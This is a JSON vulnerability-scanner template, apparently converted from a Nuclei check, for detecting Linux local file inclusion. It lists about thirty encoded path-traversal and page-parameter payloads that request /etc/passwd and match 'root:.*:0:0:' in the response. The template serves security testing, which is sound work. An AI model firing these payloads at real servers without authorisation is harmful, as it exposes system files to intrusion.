@@ -1,0 +1,194 @@
+{
+  "id": "generic-linux-lfi",
+  "name": "Generic Linux - Local File Inclusion",
+  "author": "geeknik,unstabl3,pentest_swissky,sushantkamble,0xSmiley,DhiyaneshDK",
+  "severity": "HIGH",
+  "description": "Generic Linux is subject to Local File Inclusion - the vulnerability was identified by requesting /etc/passwd from the server.",
+  "references": [
+    "https://github.com/imhunterand/ApachSAL/blob/main/assets/exploits.json"
+  ],
+  "tags": [
+    "linux",
+    "lfi",
+    "generic"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "paths": [
+      "/etc/passwd",
+      "/..%5cetc/passwd",
+      "/..%5c..%5cetc/passwd",
+      "/..%5c..%5c..%5cetc/passwd",
+      "/..%5c..%5c..%5c..%5cetc/passwd",
+      "/..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/static/..%5cetc/passwd",
+      "/static/..%5c..%5cetc/passwd",
+      "/static/..%5c..%5c..%5cetc/passwd",
+      "/static/..%5c..%5c..%5c..%5cetc/passwd",
+      "/static/..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+      "/./../../../../../../../../../../etc/passwd",
+      "/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd",
+      "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
+      "/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd",
+      "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd",
+      "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+      "/..///////..////..//////etc/passwd",
+      "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+      "/index.php?page\u003detc/passwd",
+      "/index.php?page\u003detc/passwd%00",
+      "/index.php?page\u003d../../etc/passwd",
+      "/index.php?page\u003d....//....//etc/passwd",
+      "/../../../../../../../../../etc/passwd"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}{{paths}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "generic-linux-lfi",
+    "info": {
+      "name": "Generic Linux - Local File Inclusion",
+      "author": "geeknik,unstabl3,pentest_swissky,sushantkamble,0xSmiley,DhiyaneshDK",
+      "severity": "high",
+      "description": "Generic Linux is subject to Local File Inclusion - the vulnerability was identified by requesting /etc/passwd from the server.",
+      "reference": "https://github.com/imhunterand/ApachSAL/blob/main/assets/exploits.json",
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 32
+      },
+      "tags": "linux,lfi,generic"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "paths": [
+            "/etc/passwd",
+            "/..%5cetc/passwd",
+            "/..%5c..%5cetc/passwd",
+            "/..%5c..%5c..%5cetc/passwd",
+            "/..%5c..%5c..%5c..%5cetc/passwd",
+            "/..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/static/..%5cetc/passwd",
+            "/static/..%5c..%5cetc/passwd",
+            "/static/..%5c..%5c..%5cetc/passwd",
+            "/static/..%5c..%5c..%5c..%5cetc/passwd",
+            "/static/..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+            "/./../../../../../../../../../../etc/passwd",
+            "/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd",
+            "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
+            "/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd",
+            "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+            "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd",
+            "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+            "/..///////..////..//////etc/passwd",
+            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+            "/index.php?page\u003detc/passwd",
+            "/index.php?page\u003detc/passwd%00",
+            "/index.php?page\u003d../../etc/passwd",
+            "/index.php?page\u003d....//....//etc/passwd",
+            "/../../../../../../../../../etc/passwd"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}{{paths}}"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
